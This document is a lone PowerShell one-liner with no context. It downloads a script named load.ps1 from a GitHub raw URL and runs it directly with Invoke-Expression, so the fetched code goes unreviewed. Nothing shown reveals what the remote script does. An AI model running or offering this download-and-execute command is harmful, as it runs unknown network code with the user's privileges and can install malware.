```powershell
$wc = New-Object Net.WebClient; $wc.Encoding = [System.Text.Encoding]::UTF8; iex $wc.DownloadString('https://raw.githubusercontent.com/austnv/cs/refs/heads/master/load.ps1')
```
